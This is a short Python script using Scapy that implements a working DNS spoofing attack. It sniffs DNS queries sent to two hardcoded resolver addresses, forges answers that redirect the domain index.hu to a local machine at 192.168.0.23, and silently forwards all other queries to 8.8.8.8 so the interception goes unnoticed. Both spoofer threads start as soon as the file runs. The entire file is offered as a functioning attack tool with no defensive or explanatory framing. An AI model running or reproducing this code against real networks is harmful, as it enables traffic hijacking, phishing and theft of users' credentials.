from scapy.all import *
from datetime import datetime
import time
import datetime
import sys
from threading import Thread


def DNS_Responder(dns_ip, localIP):
    def forwardDNS(orig_pkt):
        print("Forwarding: " + orig_pkt[DNSQR].qname.decode('ascii'))
        response = sr1(IP(dst="8.8.8.8") / UDP(sport=orig_pkt[UDP].sport) / \
                       DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)), verbose=0)
        respPkt = IP(src=dns_ip, dst=orig_pkt[IP].src) / UDP(dport=orig_pkt[UDP].sport) / DNS()
        respPkt[DNS] = response[DNS]
        send(respPkt, verbose=0)
        return "Responding: " + respPkt.summary()

    def getResponse(pkt):
        if (DNS in pkt and pkt[DNS].opcode == 0o0 and pkt[DNS].ancount == 0 and pkt[IP].src != dns_ip):
            if b"index.hu" in pkt['DNS Question Record'].qname:
                spfResp = IP(src=dns_ip, dst=pkt[IP].src) \
                          / UDP(dport=pkt[UDP].sport, sport=53) \
                          / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=localIP))
                send(spfResp, verbose=0)
                return "Spoofed DNS Response Sent"

            else:
                # make DNS query, capturing the answer and send the answer
                return forwardDNS(pkt)
        else:
            return False

    return getResponse


class DNS_spoofer(Thread):
    def __init__(self, dns_server_ip):
        super().__init__()
        self.DNS_server_ip = dns_server_ip
        self.filter = "udp port 53 and ip dst " + self.DNS_server_ip + " and not ip src " + self.DNS_server_ip

    def run(self):
        sniff(filter=self.filter, prn=DNS_Responder(self.DNS_server_ip, "192.168.0.23"))

dnsspoof_1 = DNS_spoofer("84.2.46.1")
dnsspoof_2 = DNS_spoofer("84.2.44.1")
dnsspoof_1.start()
dnsspoof_2.start()